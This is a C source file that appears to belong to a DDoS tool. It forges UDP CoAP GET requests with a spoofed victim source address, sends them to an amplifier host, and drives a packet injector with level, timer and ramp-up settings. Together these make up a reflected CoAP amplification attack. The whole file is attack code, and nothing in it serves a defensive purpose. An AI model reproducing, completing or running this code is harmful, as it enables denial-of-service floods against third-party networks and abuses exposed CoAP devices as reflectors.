
#include "coapforge.h"
#include "venus.h"
#include "strix.h"
#include "common/common.h"
#include "common/blacksmith.h"
#include "netuno/netuno.h"

#include "venus.h"
#define NOSIGNAL  0
#define SIGNAL_STOP 1
#define SIGNAL_ERROR 2

#define GetPort( port ) ( port > 0 ) ? port : COAP_DEFAULT_PORT
#define UDPPacketSize( payload_size ) ( IP_HEADER_SIZE + UDP_HEADER_SIZE + payload_size )

void coapSetValue( AttackPlan * p_atkData )
{
    //use for finding best URI
}

static AttackPlan * createAttackData( LhfDraft *p_draft )
{
    AttackPlan *newData;
    int arg;

    memalloc( (void *)&newData, sizeof( AttackPlan ) );
    arg = COAP_GET;
    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeCoap, &arg );
    newData->draft = p_draft;
    return newData;
}

void executeCoapAttack( AttackPlan * atkData )
{
    char *fileName = (atkData->draft->logfile[0] == '\0') ? NULL : atkData->draft->logfile;

    StartNetunoInjector( atkData->getPacket, atkData->draft->level, atkData->draft->timer, atkData->draft->incAttack, fileName);
}

int  ExecuteCoapMirror( void *p_draft )
{
    AttackPlan *plan;
    LhfDraft *draft = (LhfDraft *)p_draft;


    plan = createAttackData( draft );

    executeCoapAttack(plan);
    return 0;
}


